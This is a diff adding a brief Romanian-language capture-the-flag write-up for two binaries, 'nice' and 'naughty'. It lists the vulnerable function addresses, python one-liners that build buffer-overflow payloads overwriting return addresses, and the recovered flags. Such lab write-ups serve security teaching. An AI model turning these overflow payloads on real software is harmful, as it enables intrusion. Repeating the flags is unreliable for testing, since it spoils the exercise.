@@ -1,0 +1,35 @@
+nice:
+
+->Adresa functiei vulnerabile este: 08048666.
+
+nice_payload am pus textul cu urmatoarele comenzi:
+	python -c "print('A' * 173)" > payload_nice
+	python -c "print('A' * 343)" >> payload_nice
+	python -c "print('A' * 299)" >> payload_nice
+	python -c "print('A' * 131)" >> payload_nice
+	python -c "print('A' * 196 + '\xb1' + '\x85' + '\x04' + '\x08')" >> payload_nice
+
+flag: NICE_FLAG{83022695c3a364b39b83e517a4192479}.
+
+naughty:
+
+-> adresa functiei vulnerabile 080485b1. 
+naughty_payload: am pus textul cu urmatoarele comenzi:
+
+	python -c "print('A' * 70 + '\x3d' + '\x58' + '\x5a' + '\x1d' 
++ 'A' * 34)" > naughty_payload
+
+	python -c "print('A' * 194 + '\x7e' + '\xe2' + '\x1c' + 
+'\x2c')" >> naughty_payload
+
+	python -c "print('A' * 35 + '\x59' + '\x6d' + '\xa2' + '\x9f' + 
+'A' * 113)" >> naughty_payload
+
+	python -c "print('A' * 70 + '\xba' + '\x32' + '\x16' + '\x14' + 
+'A' * 58)" >> naughty_payload
+
+	python -c "print('A' * 196 + '\xa5' + '\x6a' + '\x63' + '\x3e' + 
+'A' * 132 + '\xb1' + '\x85' + '\x04' + '\x08' + 'BCDEF')" >> naughty_payload
+	
+	
+flag: NAUGHTY_FLAG{4b81abf9d15f00d2dcd1ef3e1133efc0}.
